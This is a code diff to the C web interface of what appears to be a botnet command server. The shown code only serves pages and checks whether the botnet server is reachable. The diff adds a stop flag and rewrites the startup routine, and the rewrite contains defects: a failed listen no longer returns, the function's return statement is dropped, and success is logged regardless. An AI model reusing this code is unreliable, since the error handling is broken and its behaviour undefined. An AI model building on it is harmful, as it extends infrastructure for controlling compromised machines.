@@ -4,6 +4,7 @@
 #include <sys/stat.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <stdbool.h>
 
 #include "../lib/mongoose.h"
 #include "../include/server/hash_table.h"
@@ -16,6 +17,8 @@
 extern ClientHashTable hash_table;
 
 static const char *static_dir = "../static"; // Website files
+bool stop_server = false; // Define the stop_server flag
+
 
 // Function to serve static files
 static void serve_static_file(struct mg_connection *c, struct mg_http_message *hm) {
@@ -107,7 +110,7 @@ void handle_server_status(struct mg_connection *c, struct mg_http_message *hm) {
     const char *web_server_ip = DEFAULT_WEB_ADDR;
     int web_server_port = atoi(DEFAULT_WEB_PORT);
 
-    //us botnet server active? (attempt connection)
+    // is botnet server active? (attempt connection)
     bool botnet_server_active = false;
     int botnet_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (botnet_socket >= 0) {
@@ -312,26 +315,21 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
 // Start web interface
 void *start_web_interface(void *arg) {
     struct mg_mgr mgr;
-    struct mg_connection *c;
+    mg_mgr_init(&mgr);
 
-    mg_mgr_init(&mgr); // Init the web manager
-    char addr[28];
-    strcpy(addr, "http://");
-    strcat(addr, DEFAULT_WEB_ADDR);
-    strcat(addr, ":");
-    strcat(addr, DEFAULT_WEB_PORT);
-    c = mg_http_listen(&mgr, addr, handle_request, NULL); // Start listening
+    // Set up the server
+    struct mg_connection *c = mg_http_listen(&mgr, DEFAULT_WEB_ADDR ":" DEFAULT_WEB_PORT, handle_request, NULL);
     if (c == NULL) {
-        // The client is not setup
-        fprintf(stderr, "Error starting web interface on port 8000\n");
-        return NULL;
+        output_log("Cannot start web server on %s:%s\n", LOG_ERROR, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);
+
     }
 
-    output_log("Web interface running on %s\n", LOG_INFO, LOG_TO_ALL, addr);
-    for (;;) {
-        mg_mgr_poll(&mgr, 1000);
+    output_log("Web server started on %s:%s\n", LOG_INFO, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);
+
+    // Main server loop
+    while (!stop_server) {
+        mg_mgr_poll(&mgr, 100); // Poll for events (100 ms timeout)
     }
 
-    mg_mgr_free(&mgr);
-    return NULL;
+    mg_mgr_free(&mgr); // Free resources
 }
